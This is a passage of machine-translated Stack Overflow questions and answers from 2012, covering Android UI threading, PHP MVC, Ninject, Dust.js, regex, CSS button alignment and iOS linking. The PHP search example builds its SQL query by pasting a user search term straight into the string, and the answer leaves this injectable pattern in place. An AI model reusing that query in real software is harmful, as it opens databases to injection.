TextView b=new TextView(getApplicationContext());
category=String.valueOf(json_data.getString("Category"));
b.setText(category);
b.setTextColor(Color.RED);
b.setTextSize(15);
tr.addView(b);
TextView b1=new TextView(getApplicationContext());
b1.setPadding(10, 0, 0, 0);
b1.setTextSize(15);
type=json_data.getString("Type");
b1.setText(type);
b1.setTextColor(Color.WHITE);
tr.addView(b1);
test+="after1col";

TextView b2=new TextView(getApplicationContext());
b2.setPadding(10, 0, 0, 0);
serves=json_data.getInt("Serves");
test+="getInt";
abc=String.valueOf(serves);
test+=abc;
b2.setText(abc);
test+="after2col";
b2.setTextColor(Color.RED);
b2.setTextSize(15);
tr.addView(b2);
TextView b3=new TextView(getApplicationContext());
b3.setPadding(10, 0, 0, 0);
b3.setTextSize(15);
city=json_data.getString("City");
b3.setText(type);
b3.setTextColor(Color.WHITE);
tr.addView(b3);
test+="after23col";
TextView b4=new TextView(getApplicationContext());
b4.setPadding(10, 0, 0, 0);
b4.setTextSize(15);
state=json_data.getString("State");
b4.setText(type);
b4.setTextColor(Color.WHITE);
tr.addView(b4);
tv.addView(tr);

final View vline1 = new View(getApplicationContext());
vline1.setLayoutParams(new TableRow.LayoutParams(TableRow.LayoutParams.FILL_PARENT,LayoutParams.WRAP_CONTENT));
vline1.setBackgroundColor(Color.WHITE);
tv.addView(vline1); // add line below each row 
// tv.addView(tr,new TableLayout.LayoutParams(LayoutParams.FILL_PARENT,LayoutParams.WRAP_CONTENT));
Log.d("check","here2");
}
}

} catch (Exception e) {
Log.d("in JSon Exception",test);
e.printStackTrace();
}
return null;
}
/**
* After completing background task Dismiss the progress dialog
* **/
protected void onPostExecute(String file_url) {
// dismiss the dialog after getting all products
Log.d("in post","wats the problem");
pDialog.dismiss();
}
}
@Override
public boolean onCreateOptionsMenu(Menu menu) {
getMenuInflater().inflate(R.menu.activity_display_store, menu);
return true;
}

@Override
public boolean onOptionsItemSelected(MenuItem item) {
switch (item.getItemId()) {
case android.R.id.home:
NavUtils.navigateUpFromSameTask(this);
return true;
}
return super.onOptionsItemSelected(item);
}

} 
```

XML-

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:tools="http://schemas.android.com/tools"
android:layout_width="match_parent"
android:layout_height="match_parent" >
<RelativeLayout
android:layout_width="match_parent"
android:layout_height="match_parent"
android:background="@drawable/backimg" >
<TableLayout
xmlns:android="http://schemas.android.com/apk/res/android"
android:id="@+id/Table" 
android:layout_width="match_parent"
android:layout_height="50dp"
android:layout_alignParentRight="true"
android:background="#ffffff"
android:shrinkColumns="*"
android:stretchColumns="*" >
</TableLayout>
</RelativeLayout>
<TextView
android:id="@+id/textView2"
android:layout_width="wrap_content"
android:layout_height="wrap_content"
android:layout_alignParentBottom="true"
android:layout_alignParentLeft="true"
android:layout_marginBottom="49dp"
android:layout_toLeftOf="@+id/textView1"
android:text="Access Through OrgID: "
android:textAppearance="?android:attr/textAppearanceMedium"
android:textStyle="bold|italic" />
<EditText
android:id="@+id/editText1"
android:layout_width="wrap_content"
android:layout_height="wrap_content"
android:layout_alignBaseline="@+id/textView2"
android:layout_alignBottom="@+id/textView2"
android:layout_toRightOf="@+id/textView2"
android:ems="10" >
<requestFocus />
</EditText>
<Button
android:id="@+id/button1"
style="?android:attr/buttonStyleSmall"
android:layout_width="wrap_content"
android:layout_height="wrap_content"
android:layout_alignParentBottom="true"
android:layout_alignRight="@+id/textView1"
android:text="Go"
android:textStyle="bold|italic" />
</RelativeLayout> 
```

错误信息-

```
11-04 15:48:21.687: E/Trace(695): error opening trace file: No such file or directory (2)
11-04 15:48:23.498: D/dalvikvm(695): GC_FOR_ALLOC freed 40K, 3% free 8013K/8259K, paused 94ms, total 98ms
11-04 15:48:23.530: I/dalvikvm-heap(695): Grow heap (frag case) to 8.625MB for 787816-byte allocation
11-04 15:48:23.857: D/dalvikvm(695): GC_CONCURRENT freed <1K, 4% free 8782K/9095K, paused 67ms+191ms, total 332ms
11-04 15:48:23.857: D/dalvikvm(695): WAIT_FOR_CONCURRENT_GC blocked 2ms
11-04 15:48:23.918: D/dalvikvm(695): GC_FOR_ALLOC freed 0K, 4% free 8782K/9095K, paused 46ms, total 46ms
11-04 15:48:23.948: I/dalvikvm-heap(695): Grow heap (frag case) to 10.317MB for 1774384-byte allocation
11-04 15:48:24.148: D/dalvikvm(695): GC_CONCURRENT freed 0K, 4% free 10515K/10887K, paused 109ms+28ms, total 203ms
11-04 15:48:24.428: D/dalvikvm(695): GC_FOR_ALLOC freed 776K, 11% free 9778K/10887K, paused 66ms, total 68ms
11-04 15:48:24.458: I/dalvikvm-heap(695): Grow heap (frag case) to 10.933MB for 1400016-byte allocation
11-04 15:48:24.678: D/dalvikvm(695): GC_CONCURRENT freed <1K, 10% free 11145K/12295K, paused 111ms+21ms, total 219ms
11-04 15:48:25.450: I/Choreographer(695): Skipped 85 frames!  The application may be doing too much work on its main thread.
11-04 15:48:25.568: D/gralloc_goldfish(695): Emulator without GPU emulation detected.
11-04 15:48:31.867: D/dalvikvm(695): GC_FOR_ALLOC freed 12K, 9% free 11227K/12295K, paused 39ms, total 42ms
11-04 15:48:31.887: I/dalvikvm-heap(695): Grow heap (frag case) to 12.348MB for 1400016-byte allocation
11-04 15:48:32.067: D/dalvikvm(695): GC_CONCURRENT freed 2K, 9% free 12592K/13703K, paused 79ms+19ms, total 173ms
11-04 15:48:32.308: D/dalvikvm(695): GC_FOR_ALLOC freed <1K, 2% free 13502K/13703K, paused 46ms, total 48ms
11-04 15:48:32.347: I/dalvikvm-heap(695): Grow heap (frag case) to 15.902MB for 2797584-byte allocation
11-04 15:48:32.537: D/dalvikvm(695): GC_CONCURRENT freed <1K, 2% free 16233K/16455K, paused 105ms+20ms, total 191ms
11-04 15:48:36.737: I/Choreographer(695): Skipped 199 frames!  The application may be doing too much work on its main thread.
11-04 15:48:37.738: I/Choreographer(695): Skipped 246 frames!  The application may be doing too much work on its main thread.
11-04 15:48:38.327: I/Choreographer(695): Skipped 129 frames!  The application may be doing too much work on its main thread.
11-04 15:48:38.517: I/Choreographer(695): Skipped 41 frames!  The application may be doing too much work on its main thread.
11-04 15:48:38.677: I/Choreographer(695): Skipped 40 frames!  The application may be doing too much work on its main thread.
11-04 15:48:39.217: I/Choreographer(695): Skipped 31 frames!  The application may be doing too much work on its main thread.
11-04 15:48:39.658: I/Choreographer(695): Skipped 72 frames!  The application may be doing too much work on its main thread.
11-04 15:48:39.917: I/Choreographer(695): Skipped 66 frames!  The application may be doing too much work on its main thread.
11-04 15:48:40.178: I/Choreographer(695): Skipped 54 frames!  The application may be doing too much work on its main thread.
11-04 15:48:40.347: I/Choreographer(695): Skipped 33 frames!  The application may be doing too much work on its main thread.
11-04 15:48:40.667: I/Choreographer(695): Skipped 30 frames!  The application may be doing too much work on its main thread.
11-04 15:48:41.327: I/Choreographer(695): Skipped 31 frames!  The application may be doing too much work on its main thread.
11-04 15:48:41.837: I/Choreographer(695): Skipped 30 frames!  The application may be doing too much work on its main thread.
11-04 15:48:43.018: I/Choreographer(695): Skipped 44 frames!  The application may be doing too much work on its main thread.
11-04 15:48:43.178: I/Choreographer(695): Skipped 41 frames!  The application may be doing too much work on its main thread.
11-04 15:48:43.357: I/Choreographer(695): Skipped 45 frames!  The application may be doing too much work on its main thread.
11-04 15:48:43.578: I/Choreographer(695): Skipped 41 frames!  The application may be doing too much work on its main thread.
11-04 15:48:43.798: I/Choreographer(695): Skipped 56 frames!  The application may be doing too much work on its main thread.
11-04 15:48:44.638: I/Choreographer(695): Skipped 35 frames!  The application may be doing too much work on its main thread.
11-04 15:48:45.548: I/Choreographer(695): Skipped 31 frames!  The application may be doing too much work on its main thread.
11-04 15:48:45.870: D/All Products:(695): [{"ContriID":"100037","Category":"V","Type":"U","Serves":"5","City":"hhhh","State":"jjjg"}]
11-04 15:48:46.179: D/i(695): -1
11-04 15:48:46.368: I/Choreographer(695): Skipped 37 frames!  The application may be doing too much work on its main thread.
11-04 15:48:47.418: D/in JSon Exception(695): herehere1here2here4here5after1colheresettext
11-04 15:48:48.058: W/System.err(695): android.view.ViewRootImpl$CalledFromWrongThreadException: Only the original thread that created a view hierarchy can touch its views.
11-04 15:48:48.128: I/Choreographer(695): Skipped 32 frames!  The application may be doing too much work on its main thread.
11-04 15:48:48.388: W/System.err(695):  at android.view.ViewRootImpl.checkThread(ViewRootImpl.java:4607)
11-04 15:48:48.459: W/System.err(695):  at android.view.ViewRootImpl.requestLayout(ViewRootImpl.java:835)
11-04 15:48:48.518: W/System.err(695):  at android.view.View.requestLayout(View.java:15129)
11-04 15:48:48.578: W/System.err(695):  at android.view.View.requestLayout(View.java:15129)
11-04 15:48:48.648: W/System.err(695):  at android.view.View.requestLayout(View.java:15129)
11-04 15:48:48.698: W/System.err(695):  at android.view.View.requestLayout(View.java:15129)
11-04 15:48:48.828: W/System.err(695):  at android.widget.RelativeLayout.requestLayout(RelativeLayout.java:292)
11-04 15:48:48.868: W/System.err(695):  at android.view.View.requestLayout(View.java:15129)
11-04 15:48:48.938: W/System.err(695):  at android.widget.RelativeLayout.requestLayout(RelativeLayout.java:292)
11-04 15:48:49.008: W/System.err(695):  at android.view.View.requestLayout(View.java:15129)
11-04 15:48:49.248: W/System.err(695):  at android.widget.TableLayout.requestLayout(TableLayout.java:226)
11-04 15:48:49.309: I/Choreographer(695): Skipped 32 frames!  The application may be doing too much work on its main thread.
11-04 15:48:49.358: W/System.err(695):  at android.view.ViewGroup.addView(ViewGroup.java:3247)
11-04 15:48:49.448: W/System.err(695):  at android.widget.TableLayout.addView(TableLayout.java:425)
11-04 15:48:49.579: W/System.err(695):  at android.view.ViewGroup.addView(ViewGroup.java:3225)
11-04 15:48:49.608: W/System.err(695):  at android.widget.TableLayout.addView(TableLayout.java:416)
11-04 15:48:49.758: W/System.err(695):  at com.example.annapurna.DisplayStore$LoadContri.doInBackground(DisplayStore.java:228)
11-04 15:48:49.848: W/System.err(695):  at com.example.annapurna.DisplayStore$LoadContri.doInBackground(DisplayStore.java:1)
11-04 15:48:49.898: I/Choreographer(695): Skipped 34 frames!  The application may be doing too much work on its main thread.
11-04 15:48:50.038: W/System.err(695):  at android.os.AsyncTask$2.call(AsyncTask.java:287)
11-04 15:48:50.098: W/System.err(695):  at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:305)
11-04 15:48:50.218: W/System.err(695):  at java.util.concurrent.FutureTask.run(FutureTask.java:137)
11-04 15:48:50.468: W/System.err(695):  at android.os.AsyncTask$SerialExecutor$1.run(AsyncTask.java:230)
11-04 15:48:50.499: W/System.err(695):  at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1076)
11-04 15:48:50.660: W/System.err(695):  at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:569)
11-04 15:48:50.798: W/System.err(695):  at java.lang.Thread.run(Thread.java:856)
11-04 15:48:50.968: D/in post(695): wats the problem
11-04 15:48:55.607: I/Choreographer(695): Skipped 36 frames!  The application may be doing too much work on its main thread.
11-04 15:51:22.140: I/Choreographer(695): Skipped 46 frames!  The application may be doing too much work on its main thread. 
```

我正在尝试从 mysql 数据库中获取数据库条目并将其显示在表中。php 文件工作正常，在 logcat 中它正在显示数据。但没有在 UI 端显示它，我无法找到错误，所以请帮忙。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T10:37:16.820

现在从您的 CatLog 中，您正在重载 UI 线程。

很可能，虽然一切都在“工作”，但加载太多而无法及时响应。

您应该做的是使用游标适配器，根据需要从数据库加载信息。

例如，您可能将 1000 个视图放在屏幕上，而您只能看到其中的 5-20 个？...它浪费了精力、CPU 时间和内存。

这将导致性能极度下降。

查看自定义/光标适配器。

ps 没有行缩进，很难阅读您发布的代码。

# php - 具有高级数据库结构的 PHP 和真正的 MVC 结构

> ID：13217782
> 
> 赞同：2
> 
> 时间：2012-11-04T10:32:11.300
> 
> 标签：php, database, model-view-controller

我正忙于开发基于纯 PHP MVC 结构的酒店预订系统的第一阶段。我尝试熟悉 Cake 和 CodeIgniter 之类的库，但我对自己的控制力如此之小并不满意。

所以我选择构建自己的迷你框架，到目前为止对我来说效果很好。现在，我使用的数据库结构相当复杂。有很多多对多关系和一对多关系。我选择不在数据库本身中强制执行任何引用完整性，因为我认为应该在编程级别完成以避免以后出现挫折 - 事情并不总是按计划进行，我发现以编程方式弄清楚发生了什么比在带有较少解释性错误消息的 SQL 数据库中

所以，对于关键 - 我正在努力做出的决定是在哪里放置这些任意 SQL 语句来处理我的不同对象之间的关系。

因此，例如，我有两个对象 - 用户和属性。在这种关系中，用户是可能容纳将出租的房间的财产的所有者。在我的用户对象模型 (MVC) 中，我有诸如“插入”、“删除”、“更新”、“获取用户”、“用户Exists”之类的方法。我的属性模型中存在类似的方法。

每个模型都扩展了我创建的数据库类，以利用与数据库的连接。

在这个结构中，我在哪里以及如何管理这些对象之间的关系？关系是 Properties_has_Users -> 它是多对多的。我在哪里为关系创建插入、更新和删除方法？在它自己的名为“Properties_Users_Relationships”的对象中？在其中一个对象的控制器中？

我是这些论坛的新手，事实上在我三年的发展过程中，我从未在论坛上发过帖子 - 只是阅读它们，所以如果您希望我发布其他内容以供参考或使其更清晰，请告诉我.

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T11:02:16.300

哇，没有冒犯，但你搞砸了。没有真或假的 MVC，只有 MVC，它是一种架构模式，与数据库无关。并且 php 有足够好的 mvc 框架，在那里你有足够的控制权。

无论如何，您应该有一个持久层来处理所有存储，包括查询、表关系等。业务层将具有对酒店预订过程进行建模的对象。业务对象不知道数据库。最好有一个 DAO 或一个存储库来实际执行查询并恢复业务对象。

**忽略数据库**问题对业务概念进行建模很**重要**。当您必须保存/加载内容时，请担心数据库。

 **仅用于查询，您可以拥有一个专门的 Dao/repository，它将隐藏 wueris 并直接返回视图的视图模型。

要理解的重要事情之一是持久性模型（您保存在数据库中的内容）与业务模型（业务概念和流程）不同。一个是简单的数据，另一个是行为。M 是多态的，它可以表示数据库结构或视图数据或业务行为。

另外，也许[这篇文章](http://www.sapiensworks.com/blog/post/2012/02/08/Understanding-the-Model-in-MVC.aspx)会帮助你更好地理解 MVC。**

# asp.net-mvc-3 - ASP.NET MVC 3 部署错误

> ID：13217785
> 
> 赞同：0
> 
> 时间：2012-11-04T10:32:56.930
> 
> 标签：asp.net-mvc-3, iis-7.5, ninject

当我使用 Ninject 运行我的 ASP.NET MVC 3 应用程序时，它运行良好，但是当我将它部署到 IIS 上时，它会出现以下错误：

```
[NullReferenceException: Object reference not set to an instance of an object.]
   Betolto.Controllers.DataInputController..ctor() +47
   DynamicInjector7922fd15a4fb4caba8ffb4cc7f18cbcf(Object[] ) +42
   Ninject.Activation.Providers.StandardProvider.Create(IContext context) +489
   Ninject.Activation.Context.Resolve() +177
   Ninject.<>c__DisplayClass10.<Resolve>b__c(IBinding binding) +30
   System.Linq.WhereSelectEnumerableIterator`2.MoveNext() +151
   System.Linq.Enumerable.SingleOrDefault(IEnumerable`1 source) +4222965
   Ninject.Web.Mvc.NinjectDependencyResolver.GetService(Type serviceType) +64
   System.Web.Mvc.DefaultControllerActivator.Create(RequestContext requestContext, Type controllerType) +51
>
[InvalidOperationException: An error occurred when trying to create a controller of type 'Betolto.Controllers.DataInputController'. Make sure that the controller has a parameterless public constructor.]
   System.Web.Mvc.DefaultControllerActivator.Create(RequestContext requestContext, Type controllerType) +182
   System.Web.Mvc.DefaultControllerFactory.GetControllerInstance(RequestContext requestContext, Type controllerType) +80
   System.Web.Mvc.DefaultControllerFactory.CreateController(RequestContext requestContext, String controllerName) +74
   System.Web.Mvc.MvcHandler.ProcessRequestInit(HttpContextBase httpContext, IController& controller, IControllerFactory& factory) +232
   System.Web.Mvc.<>c__DisplayClass6.<BeginProcessRequest>b__2() +49
   System.Web.Mvc.<>c__DisplayClassb`1.<ProcessInApplicationTrust>b__a() +13
   System.Web.Mvc.SecurityUtil.<GetCallInAppTrustThunk>b__0(Action f) +7
   System.Web.Mvc.SecurityUtil.ProcessInApplicationTrust(Action action) +22
   System.Web.Mvc.SecurityUtil.ProcessInApplicationTrust(Func`1 func) +124
   System.Web.Mvc.MvcHandler.BeginProcessRequest(HttpContextBase httpContext, AsyncCallback callback, Object state) +98
   System.Web.Mvc.MvcHandler.BeginProcessRequest(HttpContext httpContext, AsyncCallback callback, Object state) +50
   System.Web.Mvc.MvcHandler.System.Web.IHttpAsyncHandler.BeginProcessRequest(HttpContext context, AsyncCallback cb, Object extraData) +16
   System.Web.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute() +8969412
   System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean& completedSynchronously) +184 
```

我已经通过互联网搜索，但我没有找到解决我的问题的方法。我感谢所有的答案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T10:47:10.547

从堆栈跟踪来看，问题出在控制器的 (Betolto.Controllers.DataInputController) 构造函数中。所以 NInject 可能工作正常。我的猜测是错误是由其他原因引起的，开发环境和生产环境之间的差异，可能是配置文件中缺少参数或数据库数据中的差异。添加日志记录，以便您确切知道哪一行和哪个对象是导致异常的空对象。如果您可以将调试器附加到您的生产代码中，这将加快调试速度。

# node.js - Express/Dust.js - 查看数据数组

> ID：13217786
> 
> 赞同：0
> 
> 时间：2012-11-04T10:33:15.697
> 
> 标签：node.js, mongodb, express, dust.js

我目前有我的主页显示来自 MongoDB 的 6 个最古老的 Stories 帖子

我使用以下来自 Mongo 的查询：

```
var query = Story
            .find({maxlines:10})
            .sort({_id:1})
            .limit(6); 
```

然后我用它把信息传递给dust.js

```
app.get('/', function(req, res){
    query.exec(function(err, story) {
        if (err) console.log(err);
        res.render('index', {
        title: 'Test!',
        storytitle1: story[0].title,
        storylines1: story[0].lines,
        storyid1: story[0].sid,
        storyslug1: slugs(story[0].title),   
        storytitle2: story[1].title,
        storylines2: story[1].lines,
        storyid2: story[1].sid,
        storyslug2: slugs(story[1].title), 
        storytitle3: story[2].title,
        storylines3: story[2].lines,
        storyid3: story[2].sid,
        storyslug3: slugs(story[2].title),    
        storytitle4: story[3].title,
        storylines4: story[3].lines,
        storyid4: story[3].sid,   
        storyslug4: slugs(story[3].title), 
        storytitle5: story[4].title,
        storylines5: story[4].lines,
        storyid5: story[4].sid,  
        storyslug5: slugs(story[4].title),  
        storytitle6: story[5].title,
        storylines6: story[5].lines,
        storyid6: story[5].sid,  
        storyslug6: slugs(story[5].title)     
    });
    });
}); 
```

然后我在 .dust 模板上有以下内容

```
<h1 class="title">{storytitle1}</h1>
        {#storylines1}
            <ul>{text}</ul>
        {/storylines1}

<h1 class="title">{storytitle2}</h1>
        {#storylines2}
            <ul>{text}</ul>
        {/storylines2} 
```

基本上对于我单独渲染它们的 6 个，它工作得非常好，但我想知道是否有更好/更清洁的方法来做到这一点？因为我想实现另一个页面“/all/”，例如显示最后 20 个故事，我不想在模板中单独编写它们。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T11:09:26.167

尝试这个。

代码：

```
app.get('/', function(req, res){
    query.exec(function(err, story) {
        if (err) console.log(err);
        for (var i = 0; i < story.length; i++) {
            story[i].slug = slugs(story[i].title);
        }
        res.render('index', {
            title: 'Test!',
            stories: story
        });
    });
}); 
```

模板：

```
{#stories}
    <h1 class="title">{title}</h1>
        {#lines}
            <ul>{text}</ul>
        {/lines}
{/stories} 
```

# php - 需要正则表达式来查找特殊标签

> ID：13217789
> 
> 赞同：-1
> 
> 时间：2012-11-04T10:33:34.450
> 
> 标签：php, regex, arrays, string

这有点像 BB-Code 的...而且我是这样的：

```
preg_match_all('/\imgid=\[([^"*]*)\*/', '\1.\]', $html, $found); 
```

好的，那该怎么办？返回具有所有匹配值的数组；）...

因此，如果我的字符串是：“我是一个了不起的图像：imgid=[15]，而这更令人惊讶：imgid=[16]”它应该返回一个值为 15 和 16 的数组。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T10:41:52.873

你的正则表达式

```
/\imgid=/[([^"*]*)\*/', '/]\1.
         ^ error 
```

有一个错误：

> 警告：preg_match_all()：未知修饰符 '['

您应该注意正确使用[分隔符](http://php.net/regexp.reference.delimiters)。在您的情况下，我假设您的意思`\`是`/`在`[`.

此外，由于您在示例中只有数字作为 ID，因此我将`\d+`在括号内使用 for 而不是您在其中使用的内容。

# php - PHP搜索功能不执行脚本

> ID：13217791
> 
> 赞同：1
> 
> 时间：2012-11-04T10:33:37.070
> 
> 标签：php, search

我的 PHP 脚本有问题，我有一个搜索栏，但是当我将它重定向到类而不是运行脚本时，它会显示 PHP 脚本。我是 OOP PHP 编程风格的新手。

我正在尝试在我的数据库上实现一个非常简单的 OOP 搜索查询。但我很困惑为什么它将我重定向到 classes/class.House.inc 而不是执行脚本。我哪里错了？

我曾尝试在网上寻找在线 OOP 教程，但运气不佳 :( 欢迎任何帮助！

索引.php

```
 <form method="post" action="classes/class.House.inc" name="search" id="searchform">
    <input type="text" name="term" id="searchinput"/>
    <input type="submit" name="submit" id="searchsubmit" value=""/>
    </form> 
```

类/class.House.inc

```
 <?php 

   class House extends Database {

    public function search (){

            $query = "SELECT * FROM houses WHERE postcode like '%$term%'";

                    $result = $this->mysqli->query($query);

                    $num_result = $result->num_rows;    
                    if($num_result > 0){
                        while($rows =$result->fetch_assoc()){               
                            $this->data[]=$rows;
                            //print_r($rows);
                        header ("Location: ../search.php");
                        }           
                        return $this->data;
                }}}
    ?> 
```

搜索.php

```
 <table width="500" border="1" cellpadding="5">
    <tr>
      <th width="16" scope="row">id</th>
      <td width="95">bedrooms</td>
      <td width="140">description</td>
      <td width="104">roadname</td>
       <td width="71">postcode</td>
    </tr>
  <?php
        $obj = new House();
        $obj->search();
        foreach($obj->data as $val){
      extract($val);
      ?>
<tr>
<td scope="row"><?php echo $id; ?></td>
<td><?php echo $bedrooms; ?></td>
<td><?php echo $description; ?></td>
<td><?php echo $roadname; ?></td>
<td><?php echo $postcode; ?></td>
    </tr>
      <?php
  }
  ?>
  </table> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T10:45:14.340

在 index.php 修复表单

```
 <form method="post" action="search.php" name="search" id="searchform"> 
```

并在 search.php 添加这一行

```
<?php
        require("classes/class.House.inc");
        $obj = new House();
        $obj->search();
        foreach($obj->data as $val){
        extract($val);
?> 
```

以及为什么脚本显示，因为 apache 配置你需要将 inc 文件作为脚本可以原谅

# android - Android：签署apk后ADB安装错误

> ID：13217795
> 
> 赞同：2
> 
> 时间：2012-11-04T10:35:12.233
> 
> 标签：android, installation, apk, adb

我正在尝试将签名的 apk 安装到我的模拟器中。我得到的错误是“***文件 abc.apk 不包含 AndroidManifest.xml*** ”...我也压缩了签名的 apk，以检查 AndroidManifest.xml。 ...AndroidManifest.xml 在解压缩签名的 apk 后可用请帮助我...无法在我的模拟器上安装签名的 apk，所以我想我无法将其上传到 Google Market :(

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-10-23T02:54:37.130

我有这个问题，我认为我有两个问题：

1.  我通过将 APK 重命名为 .zip 扩展名、提取然后重新压缩来修改 APK，但在 Mac 上，文件夹结构无法正确保留。相反，我使用[https://ibotpeaches.github.io/Apktool/](https://ibotpeaches.github.io/Apktool/)来解码然后重建 APK。
2.  您必须记住在修改后重新签署您的 APK：[https](https://stackoverflow.com/a/24833908/62) ://stackoverflow.com/a/24833908/62 。

# html - 如何对齐 BUTTON 的文本中间

> ID：13217797
> 
> 赞同：31
> 
> 时间：2012-11-04T10:35:30.330
> 
> 标签：html, css

任何人都可以帮我在下面编码吗

这是我当前的代码

```
<div id="loginBtn" class="loginBtn"><span>Log in</span></div> 
```

div 标签有 loginBtn 类和 span 标签，在 html 页面中有“登录”文本

```
.loginBtn {
    background:url(images/loginBtn-center.jpg) repeat-x;
    width:175px;
    height:65px;
    margin:20px auto;
    border-radius:10px;
    -webkit-border-radius:10px;
    box-shadow:0 1px 2px #5e5d5b;
} 
```

我使用 1px 图像创建了按钮。现在我无法在图像中间放置“登录”文本，任何人都可以帮我完成代码

文本显示在左上角。请帮我。

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2012-11-04T10:39:21.670

您可以使用`text-align: center; line-height: 65px;`

[**演示**](http://jsfiddle.net/QvbxB/)

CSS

```
.loginBtn {
    background:url(images/loginBtn-center.jpg) repeat-x;
    width:175px;
    height:65px;
    margin:20px auto;
    border-radius:10px;
    -webkit-border-radius:10px;
    box-shadow:0 1px 2px #5e5d5b;
    text-align: center;  <--------- Here
    line-height: 65px;   <--------- Here
} 
```

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2012-11-04T14:11:30.393

这比“行高”更可预测

```
.loginBtn {
    background:url(images/loginBtn-center.jpg) repeat-x;
    width:175px;
    height:65px;
    margin:20px auto;
    border-radius:10px;
    -webkit-border-radius:10px;
    box-shadow:0 1px 2px #5e5d5b;
}

.loginBtn span {
    display: block;
    padding-top: 22px;
    text-align: center;
    line-height: 1em;
}
```

```
<div id="loginBtn" class="loginBtn"><span>Log in</span></div>
```

# 编辑（2018）：使用弹性盒

```
.loginBtn {
    display: flex;
    align-items: center;
    justify-content: center;
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-02-27T06:40:57.780

有时它会被 Padding 修复 .. 如果你可以使用它，那么它应该可以解决你的问题

```
<style type=text/css>

YourbuttonByID {Padding: 20px 80px; "for example" padding-left:50px; 
 padding-right:30px "to fix the text in the middle 
 without interfering with the text itself"}

</style> 
```

它对我有用

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-12-20T04:23:23.960

我认为您可以像这样使用 Padding：希望这个可以帮助您。

```
.loginButton {
    background:url(images/loginBtn-center.jpg) repeat-x;
    width:175px;
    height:65px;
    margin:20px auto;
    border-radius:10px;
    -webkit-border-radius:10px;
    box-shadow:0 1px 2px #5e5d5b;
    <!--Using padding to align text in box or image-->
    padding: 3px 2px;
} 
```

# uiwebview - UITabBarController 中的 MBProgressHUD

> ID：13217798
> 
> 赞同：2
> 
> 时间：2012-11-04T10:35:36.517
> 
> 标签：uiwebview, uitabbarcontroller, mbprogresshud

这让我烦恼了整整一周，因为我之前在应用程序的早期版本中使用过 MBProgressHUD。

无论我如何尝试在项目中设置代码以显示 MBProgressHUD，我总是收到“Apple Mach-O 链接器错误”：“架构 i386 的未定义符号：“_OBJC_CLASS_$_MBProgressHUD”，引用自：objc-class-ref in Home.o ld：未找到体系结构 i386 clang 的符号：错误：链接器命令失败，退出代码为 1（使用 -v 查看调用）”

下面是我在我的应用程序 m 文件中使用的源代码：

```
#import "AppDelegate.h"
#import "Home.h"
#import "SSFB.h"
#import "SST.h"

@implementation AppDelegate
@synthesize window = _window;
@synthesize tabBarController = _tabBarController;
@synthesize  navigationController = _navigationController;

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions: (NSDictionary *)launchOptions
{
self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
// Override point for customization after application launch.
UIViewController *home = [[Home alloc] initWithNibName:@"Home" bundle:nil];
UIViewController *ssfb = [[SSFB alloc] initWithNibName:@"SSFB" bundle:nil];
UIViewController *sst = [[SST alloc] initWithNibName:@"SST" bundle:nil];
self.tabBarController = [[UITabBarController alloc] init];
self.tabBarController.viewControllers = @[home, ssfb, sst];
self.window.rootViewController = self.tabBarController;
[self.window makeKeyAndVisible];
return YES;
}
@end 
```

主页.h

```
#import <UIKit/UIKit.h>
#import "MBProgressHUD.h"

@interface Home : UIViewController <UIWebViewDelegate>{
IBOutlet UIWebView *homeWebView;
IBOutlet UINavigationBar *homeNavBar;
UIAlertView *loadingAlert;
UIActivityIndicatorView *loadingTicker;
MBProgressHUD *HUD;
}

@property (retain, nonatomic) IBOutlet UINavigationBar *homeNavBar;
@property (retain, nonatomic) UIAlertView *loadingAlert;
@property (retain, nonatomic) UIAlertView *loadingTicker;
-(IBAction)refreshhomeWebView:(id)sender;
-(void)myTask;
-(void)showWithLabel;

@end 
```

最后是 Home.m 文件：

```
@implementation Home
@synthesize homeNavBar = _homeNavBar, loadingAlert, loadingTicker = _loadingTicker;

-(void)myTask{
while(homeWebView.loading){
}
}
- (void)showWithLabel {
HUD = [[MBProgressHUD alloc] initWithView:self.navigationController.view];
[self.navigationController.view addSubview:HUD];

HUD.delegate = self;
HUD.labelText = @"Loading";

[HUD showWhileExecuting:@selector(myTask) onTarget:self withObject:nil animated:YES];
}
-(void)webView:(UIWebView *)homeWebView didFailLoadWithError:(NSError *)error{
    NSLog(@"error");
 if ([error code] == -1009 || [[error localizedDescription] isEqualToString:@"no Internet connection"]){
    UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Error" message:@"There is currently no internet access." delegate:self cancelButtonTitle:@"Ok" otherButtonTitles:nil, nil];
    [alert show];
}
if ([error code] == -1001 || [[error localizedDescription] isEqualToString:@"timed out"]){
    UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Error" message:@"The connection, please try again." delegate:self cancelButtonTitle:@"Ok" otherButtonTitles:nil, nil];
    [alert show];
}
if ([error code] == -1004 || [[error localizedDescription] isEqualToString:@"can't connect to host"]){
    UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Error" message:@"Can not connect to the webpage's host at this time, please try again later." delegate:self cancelButtonTitle:@"Ok" otherButtonTitles:nil, nil];
    [alert show];
}
else{
       }
}
-(void)webViewDidStartLoad:(UIWebView *)homeWebView{
[self showWithLabel];
    NSLog(@"start load");
    }   

-(void)webViewDidFinishLoad:(UIWebView *)homeWebView{
}

-(IBAction)refreshhomeWebView:(id)sender{
